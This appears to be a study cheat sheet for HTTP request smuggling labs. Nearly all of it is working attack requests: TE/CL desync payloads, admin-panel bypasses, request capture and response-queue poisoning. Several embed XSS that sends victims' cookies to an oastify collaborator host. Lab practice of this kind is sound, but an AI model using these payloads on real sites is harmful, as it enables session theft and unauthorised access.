# HTTP Request Smuggling

> PLEASE NOTE !!!\
> Try to reset the connection by sending the **10 normal requests**, when you get into a **Bad State** to get a Fresh Connection.
> AND
> It is okay to observe the difference between using trail sequence `\r\n\r\n`  and without using trail sequence at the end of the request.

## Quick Identifying Sequence
1. Scan using `Launch All Scans` in HTTP Request Smuggling Extension.
2. Observe whether the web has the **historical search** function, and ensure the history is tied up with a cookie. Then you can refer to [this point](#h2-req-smugg-crlf) for the exploit payload.
3. Try to execute the following kind of **Basic** HTTP Request Smuggling Payload\
   > PLEASE NOTE!!!\
   > IF You Get an Error Message `Both Content-Length and Chunked were specified`, Please just jump into the `TE Header Obfuscating` technique **OR** anything of `HTTP/2 Techniques` **OR** `CL.0` Technique.
   
   a. Basic `CL.TE`
   ```HTTP
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 13
    Transfer-Encoding: chunked

    0

    SMUGGLED
    ```
   
    b. Basic `TE.CL`
    ```HTTP
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 3
    Transfer-Encoding: chunked

    8
    SMUGGLED
    0\r\n
    \r\n
    ```

4. Observe Whether `User-Agent` is Reflected in **Comment** form. Please refer to [this point](#http-req-smugg-deliver-reflected-xss) for the exploit payload.
  
5. Observe `Connection: keep-alive` in the response header to perform the `CL.0` technique. Regarding [this lab](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling), that header will appear once the user sends the request in the `HTTP/1.1` protocol. Meanwhile, in another HTTP Request Smuggling Labs, the `Connection: close` response header is always reflected.  Please use the payload in [this point](#cl0-request-smuggling) to exploit this vulnerability

6. When Identifying `HTTP/2 Techniques`, **FIRST !!!** Please execute the following payloads since they have **constant responses** and you will receive `404` in every second request, as the reason you are confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
   > PLEASE NOTE!!!\
   > Ensure the `Update Content-Length` Option is **Unchecked** in sending request option.
   
   a. Case for `CL` Header. Please refer to [this point](#h2-cl-req-smuggling) for the exploit payload.
   ```HTTP
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Length: 0

    SMUGGLED
    ```
   
    b. Case for `TE` Header. Please refer to [this point](#h2-te-req-smugg) for the exploit payload.
    ```HTTP
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Transfer-Encoding: chunked

    0

    SMUGGLED
    ``` 
   
7. When Obfuscating the `TE Dual chunk`, You can send the request using a duplicated `Transfer-Encoding` header or using a single one with various payloads. Please refer to [this poin](#te-dual-chunk)


## Exploit Payload
### HTTP/1.1 Techniques
1. <a name="te-dual-chunk">TE Dual Chunk</a>. ([original lab](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)
   ```HTTP
   POST / HTTP/1.1
   Host: TARGET.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked
   Transfer-encoding: identity

   e6
   GET /post?postId=4 HTTP/1.1
   User-Agent: a"/><script>document.location='http://OASTIFY.COM/?c='+document.cookie;</script>
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0\r\n
   \r\n
   ```
   - Various TE Header Payload for obfuscating purposes
     > maybe not placing the second `TE Header` right below the first `TE Header` is worth trying.
     ```HTTP
     Transfer-Encoding: xchunked
     
     Transfer-Encoding : chunked
     
     Transfer-Encoding: chunked
     Transfer-Encoding: x

     Transfer-Encoding:[tab]chunked

     [space]Transfer-Encoding: chunked

     X: X[\n]Transfer-Encoding: chunked

     Transfer-Encoding
     : chunked

     Transfer-encoding: identity
     Transfer-encoding: cow
     ```
     
2. <a name="cl0-request-smuggling">CL.0 Request Smuggling</a>. ([original lab](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling))
  > You have to Send 2 requests in a group using **single Connection**

  - First Request
    ```HTTP
    POST /resources/images/blog.svg HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=YOUR-SESSION-COOKIE
    Connection: keep-alive
    Content-Length: automatically

    GET /admin HTTP/1.1
    Foo: x
    ```
  - Second Request\
    Just Normal `GET` Home Request with `HTTP/1.1` protocol.
    
3. TE.CL vulnerability-bypass FE Security or TE.CL Multicase. ([original lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl))
   > Observe that you can now access the admin panel.
   ```HTTP
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked

   71
   POST /admin HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0
   ```
   
4. CL.TE vulnerability-bypass FE Security or CL.TE Multicase. ([original lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te))
   > Observe that you can now access the admin panel.
   ```HTTP
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 116
   Transfer-Encoding: chunked

   0

   GET /admin HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10

   x=
   ```
   
5. <a name="http-req-smugg-deliver-reflected-xss">HTTP request smuggling to deliver reflected XSS</a>. ([original lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)).
   > Smuggle this XSS request to the back-end server, so that it exploits the next visitor
   > Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
   
   ```HTTP
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 150
   Transfer-Encoding: chunked

   0

   GET /post?postId=5 HTTP/1.1
   User-Agent: a"/><script>document.location='http://OASTIFY.COM/?c='+document.cookie;</script>
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 5

   x=1
   ```
   
6. HTTP request smuggling to capture other users' requests or CL.TE multicase content-length. ([original lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests))
   > Send the **Comment** request by shuffling the `comment` parameter to the end of the body request. ensure it works.
   
   ```HTTP
   POST / HTTP/1.1
   Host: TARGET.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 242
   Transfer-Encoding: chunked

   0

   POST /post/comment HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 928
   Cookie: session=HackerCurrentCookieValue

   csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
   ```
   
### HTTP/2 Techniques
1. <a name="h2-cl-req-smuggling">H2.CL Request Smuggling</a>.([original lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling))
   > PLEASE ENSURE THIS BEFORE EXPLOITING THIS VULNERABILITY !!!
   > Try to send a request to `/resources` with the `HTTP/1.1` protocol. Observe, you get the `302` redirect to `https://YOUR-LAB-ID.web-security-academy.net/resources/`. Then continue executing the following payload and observe you get a `302` redirect to your **arbitrary host**.
   - Payload in **Exploit Server**:
     ```Javascript
     location="https://bapjk0f4usmytwo527764bkhl8rzfr3g.oastify.com/?c="+document.cookie;
     ```
     
   - Payload in **Repeater**
     ```HTTP
     POST / HTTP/2
     Host: 0a7b005d04382a5d80da3f6d00510058.web-security-academy.net
     Content-Length: 0

     GET /resources HTTP/1.1
     Host: exploit-0a8400ad04932a8380c93eda017c0060.exploit-server.net
     Content-Length: 5

     x=1
     ```
   
2. <a name="h2-req-smugg-crlf">HTTP/2 request smuggling via CRLF injection</a>. ([original lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection))

  - Inject the following arbitrary **Request Header** in **Inspector**
     **Name:**
      > foo
      
     **Value:**
      > bar\r\n
      > Transfer-Encoding: chunked
      
  - Switch to the `HTTP/2` protocol in the inspector request attributes
  - Enable the Allow `HTTP/2 ALPN override` option in the sending option.
  - Payload in Repeater for identifying to ensure every **second** request you send receives a `404` response
    ```HTTP
    0

    SMUGGLED
    ```
    
  - Payload in Repeater for identifying
    ```HTTP
    0
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=SESSION-COOKIE
    Content-Length: 928

    search=p-
    ```
    
3. HTTP/2 request splitting via CRLF injection ([original lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection))
   > just send the request until get the `302` response code. and use the attached cookie to do malicious action.

   - Inject the following arbitrary **Request Header** in **Inspector**
     **Name:**
      > foo
      
     **Value:**
      > bar\r\n
      > \r\n
      > GET /x HTTP/1.1\r\n
      > Host: YOUR-LAB-ID.web-security-academy.net

   - Payload in Repeater: Just send `GET /x HTTP/2`


4. <a name="h2-te-req-smugg">H2.TE request smuggling</a> ([original lab](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling))
   > Most of the time, you will receive your own `404` response.\
   > Any other response code indicates that you have successfully captured a response intended for the admin user.\
   > Repeat this process until you capture a `302` response containing the admin's new post-login session cookie

   ```HTTP
   POST /x HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Transfer-Encoding: chunked

   0

   GET /x HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net\r\n
   \r\n
   ```
